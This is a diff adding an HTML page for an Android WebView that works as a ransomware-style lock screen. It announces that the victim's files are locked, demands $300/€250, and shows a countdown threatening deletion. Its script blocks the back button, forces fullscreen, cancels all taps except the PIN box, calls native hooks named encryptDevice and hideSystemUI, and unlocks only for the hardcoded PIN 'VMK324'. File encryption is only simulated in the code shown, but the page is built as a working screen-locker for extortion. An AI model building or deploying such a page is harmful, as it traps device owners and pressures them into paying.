@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Locked</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: #550016;
+      font-family: Arial, sans-serif;
+      color: #600010;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+      user-select: none;
+    }
+    .container {
+      background: #eee;
+      padding: 5vw;
+      max-width: 90vw;
+      width: 83%;
+      max-height: 95vh;
+      overflow: auto;
+      border-radius: 12px;
+      box-shadow: 0 0 20px black;
+      text-align: center;
+      z-index: 2;
+    }
+    .logo {
+      width: 60px;
+      height: 60px;
+      margin-bottom: 20px;
+    }
+    .heading {
+      font-size: 1.2rem;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+    .subheading {
+      font-size: 1rem;
+      margin-bottom: 10px;
+    }
+    .red {
+      font-size: 1rem;
+      padding: 15px;
+      text-align: left;
+    }
+    .warning {
+      background: #fff0f0;
+      border: 2px dashed red;
+      padding: 15px;
+      margin: 15px 0;
+      font-size: 1rem;
+    }
+    .countdown {
+      font-size: 1.2rem;
+      color: red;
+      font-weight: bold;
+    }
+    input, button {
+      width: 83%;
+      padding: 12px;
+      margin: 10px 0;
+      font-size: 1rem;
+      border: 1px solid #aaa;
+      border-radius: 5px;
+      z-index: 3;
+      position: relative;
+    }
+    #payBtn {
+      background: #ccc;
+      cursor: pointer;
+      font-weight: bold;
+      transition: transform 0.15s ease;
+    }
+    #payBtn:active {
+      transform: scale(0.95);
+    }
+    #eco {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: transparent;
+      z-index: 9999;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSP_ncT1DKjhktnUtJcIMqccUw7jpzx5Fx66g&usqp=CAU" class="logo" alt="Lock Logo">
+    <div class="heading">ACCESS TO YOUR FILES AND PRIVATE DATA HAS BEEN LOCKED.</div>
+    <div class="subheading">Enter your payment details to gain access.</div>
+    <div><strong>$300 USD / €250 EUR</strong></div>
+    <div class="warning">
+      YOUR DATA WILL BE DELETED IN:<br>
+      <div class="countdown" id="timer">23:12:01</div>
+      <div style="color:red; font-weight:bold;">ACT NOW!</div>
+    </div>
+    <div class="red">Enter PIN To Unlock:</div>
+    <input type="password" id="pinInput" placeholder="PIN" />
+    <button id="payBtn" onclick="makePayment()">PIN UNLOCK</button>
+  </div>
+
+ 
+  <script>
+  // Simulate encryption of files (in real Android app, call native Java method)
+  function encryptFiles() {
+    const files = ["Documents/file1.txt", "Photos/image1.jpg", "Music/song1.mp3"];
+    const encrypted = files.map(file => ({ file, status: "ENCRYPTED" }));
+    localStorage.setItem("lockedFiles", JSON.stringify(encrypted));
+    console.log("Files encrypted.");
+    if (typeof Android !== "undefined") Android.encryptDevice?.(); // call native if exists
+  }
+
+  // Prevent back button (Android)
+  history.pushState(null, null, location.href);
+  window.onpopstate = () => {
+    history.go(1);
+  };
+
+  // Hide system UI (for Android WebView fullscreen lockdown)
+  function hideSystemUI() {
+    if (typeof Android !== "undefined") {
+      Android.hideSystemUI?.(); // should trigger immersive mode via Java
+    }
+    const el = document.documentElement;
+    if (el.requestFullscreen) {
+      el.requestFullscreen().catch(() => {});
+    }
+  }
+
+  // PIN unlock function
+  function makePayment() {
+    const pin = document.getElementById('pinInput')?.value.trim();
+    if (typeof Android !== "undefined") Android.playClickSound?.();
+
+    if (pin === "VMK324") {
+      if (typeof Android !== "undefined") Android.unlockDevice?.();
+      localStorage.removeItem("lockedFiles"); // Simulate unlock
+      window.location.href = "success.html";
+    } else {
+      alert("Incorrect PIN. Try again.");
+    }
+  }
+
+  // Countdown timer
+  let seconds = 1, minutes = 12, hours = 23;
+  setInterval(() => {
+    seconds--;
+    if (seconds < 0) { seconds = 59; minutes--; }
+    if (minutes < 0) { minutes = 59; hours--; }
+    if (hours < 0) { hours = 0; minutes = 0; seconds = 0; }
+    const timer = document.getElementById('timer');
+    if (timer) {
+      timer.textContent = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+    }
+  }, 1000);
+
+  // On page load
+  document.addEventListener('DOMContentLoaded', () => {
+    hideSystemUI();
+    encryptFiles(); // simulate encryption
+    document.getElementById('pinInput')?.focus();
+  });
+
+  // Freeze all interactions except PIN input and Unlock button
+  document.addEventListener('click', function(e) {
+    const allowed = ['pinInput', 'payBtn'];
+    if (!allowed.includes(e.target.id)) {
+      e.stopPropagation();
+      e.preventDefault();
+    }
+  }, true);
+
+  document.addEventListener('touchstart', function(e) {
+    const allowed = ['pinInput', 'payBtn'];
+    if (!allowed.includes(e.target.id)) {
+      e.stopPropagation();
+      e.preventDefault();
+    }
+  }, { passive: false, capture: true });
+</script>
+</body>
+</html>
+    
